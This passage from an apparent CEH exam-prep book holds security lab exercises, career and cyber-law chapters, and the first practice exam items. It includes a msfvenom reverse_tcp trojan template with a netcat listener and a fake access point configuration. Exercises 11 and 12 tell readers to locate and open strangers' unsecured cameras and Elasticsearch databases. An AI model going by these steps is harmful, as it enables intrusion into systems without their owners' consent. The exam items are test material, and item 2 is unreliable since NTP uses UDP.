1.  It says that the suspicious login attempt has been made on a Google account. The mail should hence be ideally coming from a Google domain account and not from any other domain.
2.  The ‘reply to’ email IDs include multiple domains whereas such emails are usually no-reply mails.

# [Exercise 5](#toc.xhtml#s234a)

**Problem Statement**: Perform packet filtering on a system interacting with a live website using Wireshark. Identify the following:

1.  Protocols being used in communication
2.  Identify the color codes assigned by Wireshark denoting a particular packet type
3.  Filter all outgoing traffic for HTTP/s

# [Solution](#toc.xhtml#s235a)

Wireshark is one of the most widely used network auditing tool. It lets you capture live data and enables offline analysis on multiple platforms with intuitive GUI.

1.  Open Wireshark. 
    
    ![](images/Figure-18.11.jpg)
    
    **Figure 18.11:** Wireshark in Kali
    
2.  Authenticate, if prompted. 
    
    ![](images/Figure-18.12.jpg)
    
    **Figure 18.12:** Authentication for root user
    
3.  Select the network adapter to capture the traffic for. 
    
    ![](images/Figure-18.13.jpg)
    
    **Figure 18.13:** Adapter selection in Wireshark
    
4.  Right-click to get a Start capture option. Click on it. 
    
    ![](images/Figure-18.14.jpg)
    
    **Figure 18.14:** Initiating traffic capture in Wireshark
    
5.  A capture screen will appear with the traffic being captured. 
    
    ![](images/Figure-18.15.jpg)
    
    **Figure 18.15:** Capturing traffic in Wireshark
    
6.  The protocols being used for communication are present in the “*Protocol*” section of the captured packet information.
7.  The color coding can be evaluated from the different colors visible for the different protocols in the capture window. Filter this by entering different protocols in the filter option and applying them by clicking on the arrow on the right end of the filter box. 
    
    ![](images/Figure-18.16.jpg)
    
    **Figure 18.16:** Color coding of traffic in Wireshark
    
8.  To capture the HTTP/s traffic, enter TLS in the filter and apply it. If there has been no https interaction till this point, it will be a blank window. 
    
    ![](images/Figure-18.17.jpg)
    
    **Figure 18.17:** Applying filter in Wireshark
    
9.  Open the web browser and navigate to any https site, like **https://www.google.com**. As soon as the website opens in the browser, notice the TLS packets captured in the capture window of Wireshark. 
    
    ![](images/Figure-18.18.jpg)
    
    **Figure 18.18:** TLS packet capture in Wireshark
    

# [Exercise 6](#toc.xhtml#s236a)

**Problem Statement**: Fingerprint devices connected to the network you are connected to for their manufacturer and make.

# [Solution](#toc.xhtml#s237a)

Device fingerprinting involves identifying the devices connected to the network and determining their characteristics like the make and model.

1.  Open the terminal and type the following command: 
    
    `arp -a`
    
    ![](images/Figure-18.19.jpg)
    
    **Figure 18.19:** ARP scan
    
2.  Access MAC address for the interfaces using popular online MAC registry searches, like 
    
    **[https://MAClookup.app/search](https://MAClookup.app/search).**
    
    1.  Open the website **[https://MAClookup.app/search](https://MAClookup.app/search)**.
    2.  Paste the first 6 hex characters of the MAC to be analyzed, like for MAC `00-50-56-e0-fb-7d`, paste 005056.
    3.  Click on search icon to get the results. 
        
        ![](images/Figure-18.20.jpg)
        
        **Figure 18.20:** MAC Lookup
        
    4.  Repeat this for the different MAC addresses identified in the command.

# [Exercise 7](#toc.xhtml#s238a)

**Problem Statement**: Create a remote access trojan with Msfvenom on Kali and use it to create a backdoor within a Windows system hosted on a virtual machine.

# [Solution](#toc.xhtml#s239a)

Msfvenom is the command line interface for Metasploit framework. The framework contains a huge variety of information and scripts for security vulnerabilities.

1.  Open Kali Linux.
2.  Update the Linux if it is due. 
    
    `sudo apt-get update`
    
    `sudo apt-get upgrade`
    
    ![](images/Figure-18.21.jpg)
    
    **Figure 18.21:** System update
    
3.  Launch msfvenom by typing the following command in the terminal: 
    
    `msfvenom`
    
4.  List the available payloads by typing the following command in the terminal: 
    
    `msfvenom -l payloads`
    
    ![](images/Figure-18.22.jpg)
    
    **Figure 18.22:** Msfvenom payload options
    
5.  Look for the `reverse_tcp` payload. 
    
    ![](images/Figure-18.23.jpg)
    
    **Figure 18.23:** Payload lookup
    
6.  Check the options available on the `reverse_tcp` payload for edit. 
    
    ![](images/Figure-18.24.jpg)
    
    **Figure 18.24:** Payload options in msfvenom
    
7.  Prepare the payload with the following command: 
    
    `msfvenom -p [payload] LHOST=[your ip address] LPORT=[the port number] -f [file type] > [path]`
    
    ![](images/Figure-18.25.jpg)
    
    **Figure 18.25:** Payload initialization in msfvenom
    
8.  Open a netcat session to enable the trojan connecting back to you. 
    
    ![](images/Figure-18.26.jpg)
    
    **Figure 18.26:** Netcat session setup
    
9.  Copy and execute the trojan on a Windows OS virtual machine in your network. 
    
    ![](images/Figure-18.27.jpg)
    
    **Figure 18.27:** Trojan execution
    

# [Exercise 8](#toc.xhtml#s240a)

**Problem Statement**: Configure the MAC filtering on your wireless router.

# [Solution](#toc.xhtml#s241a)

The MAC filtering allows you to whitelist or blacklist devices on your network on the basis of their MAC address.

1.  Connect a device to your wireless router apart from your current device.
2.  Login to your wireless router. This is usually on **http://192.168.0.1** or **http://192.168.1.1**. 
    
    ![](images/Figure-18.28.jpg)
    
    **Figure 18.28:** Router login
    
    Use the credentials set at the time of installation. If the credentials were never set, search the internet for the default credentials for your router model. Default credentials are usually: admin/admin, admin/password, administrator/password.
    
    ![](images/Figure-18.29.jpg)
    
    **Figure 18.29:** Router dashboard
    
3.  Find the MAC/Hardware address entry of the newly added device that you want to blacklist. This is usually listed in the Network/Connected devices tab in the router. Alternatively, you can find the MAC address of a device by following the manufacturer’s instructions for the same. 
    
    ![](images/Figure-18.30.jpg)
    
    **Figure 18.30:** MAC entry in router
    
4.  Add the device in Blacklisted Devices or blacklist it as per the specification of your router. 
    
    ![](images/Figure-18.31.jpg)
    
    **Figure 18.31:** Filtering of devices on the basis of MAC
    
    ![](images/Figure-18.32.jpg)
    
    **Figure 18.32:** MAC addition
    
5.  Check whether the network is accessible on your newly connected device. 
    
    ![](images/Figure-18.33.jpg)
    
    **Figure 18.33:** Blacklisted device list
    
6.  Post verification, reverse the changes done in step 4.

# [Exercise 9](#toc.xhtml#s242a)

**Problem Statement**: Configure a fake access point using a monitor mode supporting a Wi-Fi card and Kali Linux.

# [Solution](#toc.xhtml#s243a)

Fake access points are used to trick users into connecting and using them to access the internet. The access point captures all the data packets in the background and are often used to carry out malicious activities.

1.  Update Kali and install dnsmasq. 
    
    `sudo apt-get update`
    
    ![](images/Figure-18.34.jpg)
    
    **Figure 18.34:** System update
    
    `sudo apt-get install hostapd dnsmasq apache2`
    
    ![](images/Figure-18.35.jpg)
    
    **Figure 18.35:** dnsmasq installation
    
2.  Put the Wi-Fi card on the monitor mode. 
    
    `airmon-ng start <INTERFACE>`
    
    ![](images/Figure-18.36.jpg)
    
    **Figure 18.36:** Airmon-ng to enable monitor mode
    
3.  Set up a fake access point configuration. 
    
    `mkdir /root/myaccseepoint`
    
    `cd /root/ myaccseepoint`
    
    ![](images/Figure-18.37.jpg)
    
    **Figure 18.37:** Locating hostapd.conf
    
    vi hostapd.conf (use any editor of your choice)
    
    `interface=< INTERFACE >mon`
    
    `driver=nl80211`
    
    `ssid=[SSID NAME OF YOUR CHOICE]`
    
    `hw_mode=g`
    
    `channel=[ACCESS POINT CHANNEL]`
    
    `macaddr_acl=0`
    
    `ignore_broadcast_ssid=0`
    
    ![](images/Figure-18.38.jpg)
    
    **Figure 18.38:** Editing hostapd.conf
    
4.  Start the fake access point. 
    
    `hostapd hostapd.conf`
    
    ![](images/Figure-18.39.jpg)
    
    **Figure 18.39:** Initializing the fake access point
    

# [Exercise 10](#toc.xhtml#s244a)

**Problem Statement**: Lookup TXT and other records of some websites and try to determine whether they are using cloud hosting and if yes, then find out who their cloud provider is.

# [Solution](#toc.xhtml#s245a)

1.  Create a list of websites you want to enumerate.
2.  Open any online TXT record enumeration tool, like **[https://mxtoolbox.com/TXTLookup.aspx](https://mxtoolbox.com/TXTLookup.aspx)**. 
    
    ![](images/Figure-18.40.jpg)
    
    **Figure 18.40:** mxtoolbox.com
    
3.  Perform a lookup for TXT record of the websites in your list. 
    
    ![](images/Figure-18.41.jpg)
    
    **Figure 18.41:** TXT Lookup-1
    
    ![](images/Figure-18.42.jpg)
    
    **Figure 18.42:** TXT Lookup-2
    
    ![](images/Figure-18.43.jpg)
    
    **Figure 18.43:** TXT Lookup-3
    
    ![](images/Figure-18.44.jpg)
    
    **Figure 18.44:** TXT Lookup-4
    
    ![](images/Figure-18.45.jpg)
    
    **Figure 18.45:** TXT Lookup-5
    
4.  Examine the TXT records to extract the information. 
    
    For **example:** A sample TXT record would look like:
    
    `v=spf1 +a +mx +a:vmi185372.contaboserver.net -all`
    
    which reveals that the website is most probably using Contabo as the cloud provider.
    
    Another record, **yandex-verification: <record>**, reveals that the site uses at least one of the Yandex services that requires a TXT verification.
    
    Note that some websites like *goolge.com* do not have TXT records published.
    

# [Exercise 11](#toc.xhtml#s246a)

**Problem Statement**: Use Google search advance queries to connect to a remote surveillance system.

# [Solution](#toc.xhtml#s247a)

Google provides specific query parameters to enable more precise searches across various factors. The Google advanced search console provides a GUI to let users easily access these options.

1.  Go to **https://www.google.com/advanced\_search**
2.  Type in a sample search query, like “*MultiCameraFrame?Mode=Motion*”, in the search input.
3.  In the narrow results section, select the terms appearing as “*in the url of the page*”.
4.  Browse the search results to find an unsecured system.
5.  Try varying search options to uncover more such cases.

# [Exercise 12](#toc.xhtml#s248a)

**Problem Statement**: Gain access to unauthenticated connected system databases on the internet.

# [Solution](#toc.xhtml#s249a)

There are a lot of unauthenticated databases present on various cloud services as a result of oversight or misconfigurations. Cloud and IoT search engines like *Shodan* can be used to detect such systems and these can then be connected via readily available tools like database connectors.

1.  Download a GUI tool for ElasticSearch, like ElasticSearch toolbox (**https://chrome.google.com/webstore/detail/elasticsearch-toolbox/focdbmjgdonlpdknobfghplhmafpgfbp**).
2.  Go to **[https://www.shodan.io/explore](https://www.shodan.io/explore)**.
3.  In the search query, put “*Elasticsearch*”.
4.  Go through the search results to find the system IPs.
5.  Try connecting it with the browser directly on the 9200 port.
6.  If it connects, use the Elasticsearch tool box to explore more information stored in the database.
7.  DO NOT alter any of the databases. It might attract legal action.

You can repeat these steps with nearly all databases by using the appropriate database connection tool and default login config.

Shodan as a search engine will give access to a lot more IoT devices. Feel free to explore.

# [Exercise 13](#toc.xhtml#s250a)

**Problem Statement**: Analyze the following TCP header and answer the questions on the basis of your analysis.

`0000   08 00 27 5c 65 26 5c f9 fd 69 86 10 08 00 45 00   ..'\e&\..i....E.`

`0010   00 34 41 e9 00 00 7a 06 ea 54 ac d9 a6 02 c0 a8   .4A...z..T......`

`0020   01 02 01 bb db 44 9d 14 f7 6c c0 d7 00 7f 80 10   .....D...l......`

`0030   01 15 85 bb 00 00 01 01 08 0a 46 b7 7d 75 a1 0a   ..........F.}u..`

`0040   43 57                                             CW`

1.  What is the urgent pointer set to?
2.  What is the TTL?
3.  What is the destination IP?
4.  What is the destination port?
5.  What is the sequence number?

# [Solution](#toc.xhtml#s251a)

The composition of a TCP header is as follows:

![](images/Figure-18.46.jpg)

**Figure 18.46:** TCP header

We can now determine the requested values as:

The urgent pointer is set to 00 00.

The TTL is set to 7a (122).

The destination IP is c0 a8 01 02 (192.168.1.2).

The destination port is db 44 (56132).

The sequence number is 9d 14 f7 6c (2635396972).

# [Conclusion](#toc.xhtml#s252a)

By now, you should be comfortable in handling some of the basic tools and processes in penetration testing. You should also have been familiarized with the Metasploit framework to some extent. You should also have had exposure to searching information on the web, especially Google and the IoT search engines.

The tasks here cover just the very basic processes, but should be enough to get you going on more complex and challenging tasks in the CEH - Practical curriculum.

The next chapter will put forth the career options available to a security professional and a way forward into deeper learning of the cyber security universe.

# [CHAPTER 19](#toc.xhtml#c19)

# [Roadmap for a Security Professional](#toc.xhtml#c19)

# [Introduction](#toc.xhtml#s253a)

Cybersecurity as a career is one of the most lucrative options in the information technology scene. With enterprises and the public, in general, becoming more aware and concerned about security and privacy, the avenues for cybersecurity professionals are innumerable. The only deterrent has been delayed recognition of cybersecurity as a specialization in mainstream education, something that has been rectified in more recent times.

# [Structure](#toc.xhtml#s254a)

We will cover the following topics in this chapter:

*   Cybersecurity industry
*   Certification and academic routes
*   Career options in the information security industry

# [Objectives](#toc.xhtml#s255a)

This chapter deals with the dilemma you might have about the next steps post successful completion of the CEH certification or even if you are still evaluating which certification or course to take up. Through this chapter, we will try to identify the career options available in the cybersecurity industry, their requirements, and the various routes one can take to become a successful security professional.

# [Cybersecurity Landscape](#toc.xhtml#s256a)

The cybersecurity industry is already a multi-billion-dollar industry worldwide. With information technology and software intruding into almost every industry, the market for security solutions is growing at unprecedented levels. With cybercrime predicted to cost more than USD 6 trillion next year, the industry is far short on professionals and solutions, and with a median salary of USD 92000, cybersecurity is as lucrative a career as any.

With an overwhelming volume of options and career directions, it is easy to get lost in the universe of cybersecurity. The career choices range from being an ethical hacker to a cyber-activist to an academician. Let us explore some of these options and what your average day would look like.

*   **Ethical Hacker:** An information security expert, ethical hacker hacks into systems to analyze it against possible vulnerabilities and helps the system owners proactively patch their environment before an actual attack occurs. An ethical hacker, of course, works in close coordination with the system owner post acquiring all the permissions and working under the purview of a contract. This is perhaps the most famous and talked about career choice in the cybersecurity universe.
*   **Network Security Engineer:** A network security engineer is tasked with maintaining the security infrastructure of the network. This includes maintaining the integrity of the network, assessing the existing vulnerabilities, assessing network integrations, planning and executing patches, monitoring and governing interactions within and across networks, and defining security policies.
*   **IT Security Analyst:** Somewhat similar to a network security engineer, a security analyst draws up plans and educates organizations and individuals on the impact of threats and their solutions. One can further get specialized to more specific areas like corporate networks, VPNs, production environments, or data centers. These are people with expert knowledge on minute details of components. 
    
    ![](images/Figure-19.1.jpg)
    
    **Figure 19.1:** Cybersecurity professional career paths
    
*   **Cyber Forensic Investigator:** A cyber forensic investigator, much like its medical counterpart, is tasked with drawing up and following trails of cyber criminals and frauds to unearth pieces of evidence and possibly laying honeytraps to catch the violators. Cyber forensic investigators can be hired by both private and government institutions.
*   **Cybersecurity Auditor:** As the name suggests, the primary task of a security auditor is to examine and rate the standards of security being followed in a solution, system, or even corporations as a whole. Security audits primarily focus on data flows, access systems, their accountability, and planning. Auditors may be hired by organizations to meet the auditing requirements set forth by the cyber laws of a country or as part of its own security policy to get an independent assessment of its security processes to be better prepared.
*   **Bounty Hunter:** A bounty hunter is a security enthusiast who works independently or in a team to find security flaws in the systems of organizations as part of their bounty programs. The bounty programs are run by several organizations and groups that reward people who report vulnerabilities in their systems. Quite similar to ethical hacking, there is usually no contract of employment in bounty hunting, but of course, a contract on the scope and methodologies to be used. 
    
    ![](images/Figure-19.2.jpg)
    
    **Figure 19.2:** Average annual salary comparison for cyber security jobs
    

Additionally, there are traditional career choices of being a software developer, solutions architect designing, and developing security solutions for applications, systems, and organizations.

Or the knowledge of cybersecurity can simply be a differentiating add-on for an IT professional.

![](images/Figure-19.3.jpg)

**Figure 19.3:** Critical areas within cybersecurity

In terms of knowledge upgrade, there is a multitude of options in terms of certifications and specializations in the market that prepare and assist you in knowledge career growth.

# [Network Security](#toc.xhtml#s257a)

1.  **Cisco Certified Network Associate (CCNA - Cisco)**: The CCNA certification by Cisco is one of the well-known certifications pertaining to fundamentals and skills in network fundamentals, network access, IP connectivity, IP services, security fundamentals, and automation and programmability.
2.  **Cisco Certified Network Associate with Specialization in Security (CCNA Security - Cisco)**: Not to be confused with the CCNA, CCNA Security is based around designing, creating, and maintaining secure networks primarily over Cisco devices.
3.  **Cisco Certified Network Professional with Specialization in Security (CCNP Security - Cisco)**: This is aligned especially with the job role of a Cisco network security engineer responsible for security. It has two exams, one covering the core security technologies and one security concentration exam of your choice.
4.  **Cisco Certified Internetworking Expert with Specialization in Security (CCIE Security - Cisco)**: This program recognizes security experts who have the knowledge and skill to implement and maintain extensive network security solutions using the best industry practices.
5.  **Certified Network Defender (CND – EC Council)**: It is a skill-based, lab-intensive program based on the security education framework, vendor-neutral, hands-on, instructor-led, comprehensive networking security certification training program.
6.  **Certified SOC Analyst (CSA – EC Council)**: It enables the candidate to acquire trending and in-demand skills through instruction by some of the most experienced instructors in the industry. The applicant will figure out how to oversee different SOC processes and collaborate with CSIRT in time of need.
7.  **Advanced Network Defense (CAST – EC Council)**: This is a comprehensive, structured, and fast-paced program that immerses you into the world of an ethical hacker, providing insights into their mindset, a critical weapon for defending against some of the most malicious attacks around.

# [Cyber Forensics](#toc.xhtml#s258a)

1.  **Certified Cyber Forensics Professional (CCFP – ISC2)**: It endeavors to enhance the technical understanding of the forensic techniques and processes for solving cybercrime cases.
2.  **Certified Hacking Forensic Investigator (CHFI – EC Council)**: It summarizes the essential knowledge of digital forensic techniques and standard forensic tools to collect the intruders’ footprints necessary for this investigation.
3.  **Advanced Digital Forensics and Incident Response (FOR508 - SANS)**: Learn how to hunt down, detect, counter, and recover from a variety of threats in enterprise networks, including APT nation-state adversaries, organized crime syndicates, and hacktivities.
4.  **Certified Threat Intelligence Analyst (CTIA – EC Council)**: It is a comprehensive, specialist-level program that teaches a structured approach for building effective threat intelligence and organizing the latest demands of professional-level CTIA who can extract intelligence from data by implementing various advanced strategies.
5.  **EC-Council Certified Incident Handler (ECIH – EC Council)**: The **EC-Council Certified Incident Handler** (**ECIH**) program focuses on a structured approach for performing the **incident handling and response** (**IH&R**) process. The IH&R process includes stages like incident handling and response preparation, incident validation and prioritization, incident escalation and notification, forensic evidence gathering and analysis, incident containment, system recovery, and incident eradication.

# [Penetration Testing](#toc.xhtml#s259a)

1.  Offensive Security Certified Professional (OSCP – Offensive Security): This online ethical hacking course is self-paced. It introduces penetration testing tools and techniques via hands-on experience. PEN-200 trains not only the skills but also the mindset required to be a successful penetration tester. Students who complete the course and pass the exam earn the coveted **Offensive Security Certified Professional** (**OSCP**) certification.
2.  Certified Ethical Hacker (CEH – EC Council): Certified Ethical Hacker CEH v11 will teach you the latest commercial-grade hacking tools, techniques, and methodologies used by hackers and information security professionals to lawfully hack an organization.
3.  EC Council Certified Security Analyst (ECSA – EC Council): The ECSA program offers seamless learning progress, continuing where the CEH program left off. Unlike most other penetration-testing programs that only follow a generic kill chain methodology, the ECSA presents a set of distinguishable comprehensive methodologies that are able to cover different pen testing requirements across different verticals.

# [Cyber Auditing](#toc.xhtml#s260a)

1.  **Certified Information Systems Auditor (CISA - ISACA)**: Validate your expertise and get the leverage you need to move up in your career. With ISACA’s **Certified Information Systems Auditor** (**CISA**) certification, you can do just that. CISA is world-renowned as the standard of achievement for those who audit, control, monitor, and assess an organization’s information technology and business systems.
2.  **ISO 27001 Lead Auditor (ISO 27001 LA - IRCA)**: This course is certified by the **International Register of Certificated Auditors** (**IRCA**) and meets training requirements for those seeking registration as a lead auditor under their ISMS scheme and teach how to lead, plan, execute, and report on an audit of an ISMS in an organization assessing its conformance with ISO/IEC.
3.  **GIAC Systems and Network Auditor (GSNA - GIAC)**: The **GIAC Systems and Network Auditor** (**GSNA**) certification validates a practitioner's ability to apply basic risk analysis techniques and conduct technical audits of essential information systems. GSNA certification holders have demonstrated knowledge of network, perimeter, and application auditing as well as risk assessment and reporting.
4.  **Certified Internal Auditor (CIA - Institute of Internal Auditors)**: **Certified Internal Auditor** (**CIA**) is a certification program offered by the **Institute of Internal Auditors - USA**. In India, IIA India manages the program. The CIA program helps candidates gain professional knowledge in internal audits.

# [Software Professional](#toc.xhtml#s261a)

1.  **Certified Information Security Manager (CISM - ISACA)**: The CISM Certification Training is an excellent step for you to sharpen your skillset as an IT security professional. This Certified Information Security Manager course validates your learning and experience required to create a robust data security program.
2.  **Certified Secure Software Lifecycle Professional (CSSLP - ISC)**: The CSSLP certification recognizes leading application security skills. It shows employers and peers you have the advanced technical skills and knowledge necessary for authentication, authorization, and auditing throughout the SDLC using the best practices, policies, and procedures established by the cybersecurity experts at ISC).
3.  **Certified Application Security Engineer (CASE – EC Council)**: The **Certified Application Security Engineer** (**CASE .NET**) credential tests the critical security skills and knowledge required throughout a typical **software development lifecycle** (**SDLC**), focusing on the importance of the implementation of secure methodologies and practices in today’s insecure operating environment. The CASE certified training program is developed concurrently to prepare software professionals with the necessary capabilities that are expected by employers and academia globally.

While a certification is not an absolute must in fields like application security, they are a differentiator and for many institutions, a basic eligibility criterion.

![](images/Figure-19.4.jpg)

**Figure 19.4:** OWASP chapter home page

![](images/Figure-19.5.jpg)

**Figure 19.5:** Null community home page

It is also an advantage if you are familiar with the basics of some software languages, on the lines of a scripting language like Python, web basics like JavaScript and PHP, shell scripting, database querying with basic SQL.

You can also join local security chapters like OWASP and NULL. Be part of discussions and observe. In the field of information security, keeping up with technology and the latest developments is the keystone to sustainability.

# [Conclusion](#toc.xhtml#s262a)

Choosing the right specialization or certification is just a small step towards pursuing cybersecurity as a career option. This is a field that requires an immense amount of practical and hands-on knowledge, something that only a few courses actually offer. Another daunting task is keeping up with the changes in technologies and advancements to prevent you from becoming obsolete.

Being a cyber-security professional or trying to be one is seldom a tightrope walk on the lines of legality and ethics, and should you choose to pursue a career in the same, be sure to respect the laws and privacy of others. To get a sense of the legal angles involved, the next chapter will be listing out a few prominent cyber laws across the globe.

# [CHAPTER 20](#toc.xhtml#c20)

# [Digital Compliances and Cyber Laws](#toc.xhtml#c20)

# [Introduction](#toc.xhtml#s263a)

The onset of the digital age has been one of the most important developments of human history, and with it has come the problems of regulating and securing digital assets, services, and infrastructure. While most of the industry is self-regulated, there are some major compliance standards and local rules guiding the transmission, storage, and use of data across the digital landscape.

# [Structure](#toc.xhtml#s264a)

We will cover the following topics in this chapter:

*   Need for compliances and cyber laws
*   Challenges in drafting the regulations for cyber laws
*   Important compliances and cyber laws

# [Objectives](#toc.xhtml#s265a)

This chapter will take the reader through some of the regulations and compliance requirements across the information technology industry and at various geographies. It will also bring forth some of the major challenges and considerations that lawmakers and organizations have to cater to while designing and implementing these safeguards to the digital universe.

# [Need for Compliances and Cyber Laws](#toc.xhtml#s266a)

There has always been advocacy of self-governance in the information technology field, with a sound framework to respect the local laws and policies. Furthermore, given the magnitude of data and information flowing through the various information systems, it is of paramount importance that there are at least some guiding principles on the governance of the industry as a whole, and certain important sectors in specific.

There have hence been quite a few instances of organizations coming together within a domain, or across multiple domains, and laying down mutually agreed best practices and process requirements for an information system to be acceptable to use. Though these might not be binding on a system, incorporating them gives out a sense of security to the user and also forms a solid ground for an organization to safeguard its system.

A very common example of this is the PCI DSS set of standards used religiously across the payments industry to certify their stack. Then there is HIPPA compliance used widely across the healthcare domain to standardize data privacy and security.

It is, however, very easy to neglect even the most critical safeguards when it comes to industries that are self-regulated. It becomes more challenging with very blurry legal boundaries when it comes to information accessibility and flow. The problem can be pure oversight or intentional corner-cutting to save time or cost. Whatever be the reason, the results of such practices have been proven to be disastrous time and again, often costing much more to rectify than it would have taken to be built up in the first place.

To safeguard industries, and often the end customers, against such practices and to keep checks on the criminal activities over the digital systems, governments across the globe have hence laid guidelines for the industry to follow. These are sometimes also complemented by local laws of the land to enforce certain critical aspects more rigorously. The problem, however, with local laws is that while a law may be applicable to one geography, it might not be so in another country.

Let us take a quick look into all the aspects that need to be considered while designing compliance or law in the cyberspace:

*   **Data and Information Privacy**: A big change in the general mindset over the last decade has been towards privacy, especially at the individual level. With huge scandals breaking out, often a neglected topic, privacy policies have suddenly found many scrutineers. More and more people are concerned about how their data is accessed, stored, and processed by applications and the implications these processes have on their privacy.
*   **System and Product Heterogeneity**: Perhaps the biggest deterrent to effective compliance and laws is the wide variety of processes and their actual implementations. With each vendor having its own flavor of infrastructure and frameworks in place, having a common standard as well as measuring the effectiveness for each individual flavor can be a huge challenge.
*   **Poor Self-regulation**: There has always been advocacy for self-regulation in the information system market, and a few responsible players have made the practices an integral part of their processes. The problem lies with the organizations not following these protocols. There have been numerous occasions of organizations turning a blind eye to irregularities in their products or services for financial gains. Most software firms regularly overlook the security of stored data within their systems until a breach occurs and is actually made public.
*   **Scope of Liability**: Perhaps the biggest challenge for a regulator or lawmaker in the information system landscape is to define the scope of a regulation or law. Information systems tend to be used for a variety of purposes and a blanket rule or regulation for all, as discussed before, is not always the best solution. A coupon distribution website would obviously not be under the same purview as a banking website in terms of data privacy and protection.
*   Another aspect lies within the geographical boundaries of an offense. With data and information distributed across nations, the investigation of breaches becomes a big problem for agencies, especially if the data is stashed in servers in another country or the organization itself is based out of a foreign location.

Yet another aspect lies in the sharing of information across organizations, especially in the world of connected things and all things hyperlocal and targeted. Regulating what flows without the consent of its owner and, of course, defining the ownership of data is a momentous task that is seldom left unfinished or with a lot of loopholes.

Let us look into some of the popular standards, regulations, and cyber laws across the industry:

**PCI DSS**: The Payment Card Industry Data Security Standard is an industry standard for financial institutions dealing with how a customer’s financial information is handled by the system. Though not mandated by the government, nearly all the financial firms dealing with credit cards and other financial instruments mandate its implementation on themselves and their vendors.

At its core, the PCI DSS standard lays down twelve standard requirements for an institution to provide a minimal amount of security to the data and processes being handled by it. These can be summarized as follows:

*   Firewall configuration requirement for data store
*   Prohibition of the usage of vendor-provided default credentials and security configurations for the system
*   Protection of stored cardholder data
*   Encryption of data in transmission
*   Regular update of the security systems including antivirus and firewalls
*   Development and maintenance of inherently secure applications
*   Access of data on a need-to-know basis only
*   Unique identification of users accessing the system
*   Restriction of physical access to the cardholder data
*   Tracking and monitoring of all system activities
*   Regular test and audit of the security system and practices
*   Maintenance of policy to address information security for all personnel

**GDPR**: The General Data Protection Regulation of the European Union came into force on May 25^(th), 2018, and has since been adapted in various forms across many nations. Simply putting, GDPR lays down the requirement of obtaining consent, minimizing the data that an organization holds over an individual, and ensuring the rights of the data subjects. The regulation lays down the end-users’ right to know what data of theirs is being handled by an organization, the processing they are doing on it, and most importantly, the reporting of any breaches that happen on the data.

**HIPPA**: A cornerstone of healthcare IT standards, the Health Insurance Portability and Accountability Act of 1996 lays down how US organizations deal with an individual’s healthcare and medical data with respect to its storage, access, and portability within and across systems.

HIPAA mandates that access to electronic health records be limited to those who have a legitimate reason to see them and therefore, encryption and strong access controls are essential. The standards apply not only to information within the database but also when they are transferred. Therefore, steps must be taken to guarantee that actions like email and file transfers are adequately monitored, protected, and regulated.

**CCPA**: The California Consumer Privacy Act came into effect on January 1^(st), 2020. Similar to GDPR, it aims to give larger transparency and control over individual data and its processing to the end-user. It goes on to allow users to sue the organizations for data breaches for damages up to $750 per record and a direct penalty of up to $7500 per violation to adherence on part of the organizations.

**PIPEDA**: A Canadian federal privacy law for private-sector organizations, PIPEDA aims to regulate personal data handling and the processing of Canadian citizens by organizations within and outside the Canadian territory. The Personal Information Protection and Electronic Documents Act provisions for up to CAD$100000 in fines for non-compliance.

Other major cyber laws include the **Protection of Personal Information** (**POPI**) Act, South Africa); Australian Data Privacy Regulations (Australia); LGPD (Brazilian General Data Protection Act, Brazil); **Sarbanes-Oxley Act** (**SOX**), United States; Information Technology Act, India.

# [The privacy debate](#toc.xhtml#s267a)

A very important aspect of internet security is the user data being safe from unauthorized and unwanted access. While the aspect of malicious hackers and greedy organizations is most zealously covered, the dangers of prying government agencies and law enforcement organizations are often buried deep with the excuse of national security.

There have been innumerable instances of governments building backdoors in encryption standards and enforcing their use in order to be able to tap into all the information flowing in the system and attributing each byte of information to its origin. Often, governments do not even care to hide the fact that they are snooping into the daily lives of each and every citizen and sometimes, even foreign nationals.

Another side of this debate starts with the statement of “*I don’t have anything to hide*” sentiment. And while this might be true to your belief, there is hardly an individual who cannot be prosecuted on the basis of their online activities, from these being as small as downloading a song illegally or sharing a copyrighted picture or a link that might contain some deemed illegal information, and so on. And when the law enforcement wants, it can in an instant build a mountain of cases against you for even a single act of dissent. This leads us to the ‘what if’ scenario of a hostile government coming to power and the resistance being crushed due to a lack of secure communication.

Historically, we have been unable to find a middle ground to this problem. Any leniency in cyber laws leads to the rise of the cyber underworld and on the other extreme, the governments find it very hard to resist the temptation of complete control and modulation of the masses as per their philosophies.

# [Activity](#toc.xhtml#s268a)

To test your understanding of compliances and their implementations, study the following information breaches and hacks and prepare regulations that could have prevented or at least reduced the impact of these incidents.

1.  Stuxnet Worm on Iran Nuclear Program, 2005-2010
2.  Adobe Data Breach, October 2013
3.  Equifax Hack, July 2017
4.  Heartland Payment Systems Breach, March 2008
5.  Yahoo Data Breach, 2013-14
6.  Google China Breach, 2009
7.  Software AG Ransomware Attack, 2020
8.  Telegram Hijack, 2020
9.  WannaCry Ransomware, 2017

# [Conclusion](#toc.xhtml#s269a)

With new advancements in technology, criminals in the cyber world have usually been ahead of the game, evolving at a pace faster than the law agencies across the world. Protecting cyberspace from crime is hence a momentous, ever-evolving process. While the cyber laws and regulations have been trying to catch up, there is still a large ground to be covered, especially on the governments’ part to build trust in their policies and for effective implementations.

# [CHAPTER 21](#toc.xhtml#c21)

# [Self-Assessment 1](#toc.xhtml#c21)

# [Objective](#toc.xhtml#s270a)

This chapter is devised for you to understand your preparation level for CEH certification and application security in general. The assessment is based on the actual questions that are asked in the certification exam, and can form an excellent source of revision.

# [Instructions](#toc.xhtml#s271a)

*   The assessment comprises of 125 multiple choice questions.
*   The assessment is to be completed in a duration of 4 hours.
*   Each question carries one mark, with no negative marking.
*   Passing score is 85% or 106 correct answers.
*   The answer key is provided at the end of the assessment.

# [Assessment](#toc.xhtml#s272a)

1.  **Which of the following cryptography attacks is an understatement for the extraction of cryptographic secrets (e.g. the password to an encrypted file) from a person by coercion or torture?** 
    1.  Chosen-ciphertext attack
    2.  Ciphertext-only attack
    3.  Timing attack
    4.  Rubber-hose attack
2.  **You perform a scan of your company’s network and discover that TCP port 123 is open. What services by default run on TCP port 123?** 
    1.  Telnet
    2.  POP3
    3.  Network Time Protocol
    4.  DNS
3.  **Which of the following is considered as one of the most reliable forms of TCP scanning?** 
    1.  TCP Connect/Full open scan
    2.  Half-open scan
    3.  NULL scan
    4.  Xmas scan
4.  **Which component of IPsec performs protocol-level functions that are required to encrypt and decrypt packets?** 
    1.  Internet Key Exchange (IKE)
    2.  Oakley
    3.  IPsec policy agent
    4.  IPsec driver
